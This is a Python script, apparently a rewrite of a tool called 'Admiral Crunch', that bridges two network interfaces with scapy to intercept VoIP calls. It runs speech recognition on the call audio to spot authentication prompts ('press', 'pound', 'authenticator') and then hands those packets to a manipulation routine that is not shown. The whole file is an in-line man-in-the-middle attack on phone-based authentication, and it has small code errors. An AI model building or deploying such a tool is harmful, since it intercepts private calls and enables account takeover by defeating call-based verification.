#!/usr/bin/python3
# This is a rewrite of Admiral Crunch in python
from scapy.all import *
from scapy.layers import inet, rtp
import scapy.sendrecv
from conversation import *
from threading import Thread
import logging
import speech_recognition as rec

cstore = convostore()

gb = girlboss()

def gatekeep(tmp: Packet):
    global cstore, girlboss
    '''decides how packets should flow through the bridge'''
    # Packet isn't VOIP, we don't care about it
    if tmp.lastlayer().name != "Raw" and tmp.lastlayer().name != "RTP":
                return True

    # Check if this is part of an existing sessionRTP
    for con in cstore.conversations:
        if con.deleteme:
            cstore.lock.acquire()
            cstore.conversations.remove(con)
            cstore.lock.release()
            continue
        stat = con.get_enforce(tmp)
        # Conversation exists, not enforcing
        if stat == 1:
            # Add the packet (UDP layer and above) to conversation object
            # If packet is SIP BYE, delete conversation
            cstore.lock.acquire()
            if not con.add(tmp):
                cstore.conversations.remove(con)
                # reset manupulator
                gb.reset()
                logging.info("recieved SIP BYE, destroying conversation")
            # Tell main thread to let the packet through
            cstore.lock.release()
            return True

        # Conversation exists, enforcing
        elif stat == 2:
            #manipulate data
            return gb.manipulate(tmp)
    cstore.lock.acquire()
    cstore.conversations.append(conversation(tmp))
    cstore.lock.release()


def analysis(cstore: convostore):
    logging.info("starting analysis thread")
    keywords = [("press",0.8),("pound",0.8),("authenticator",0.8),("authentication",0.8)]
    interp = rec.Recognizer()
    while True:
        line: conversation
        for line in cstore.conversations:
            #If there's no new data or it's already enforcing, skip
            if (not line.analysis_flag) or line.framecount < 25: continue
            line.framecount = 0 #only re-run analysis every .5 seconds of new data
            line.bufferLock.acquire()
            stream = rec.AudioFile(line.buffer)
            line.bufferLock.release()
            stream.SAMPLE_RATE = 8000
            stream.SAMPLE_WIDTH = 8
            audio = interp.record(stream)
            out:str = interp.recognize_sphinx(audio,keyword_entries=keywords)
            logging.info("Speech recognition: ",out)
            for key in keywords:
                if key[0] in out:
                    line.enforce = True
        if len(cstore.conversations) == 0:
            time.sleep(0.1)


analysis_thread = Thread(target=analysis, args=(cstore, ))
analysis_thread.start()

# Made up NIC names for now
## haha get it like nicknames but it's NICs i'm so funny
packetlog = scapy.sendrecv.bridge_and_sniff(if1='enp5s0',if2='enp5s1',xfrm12=gatekeep)
packetlog.show()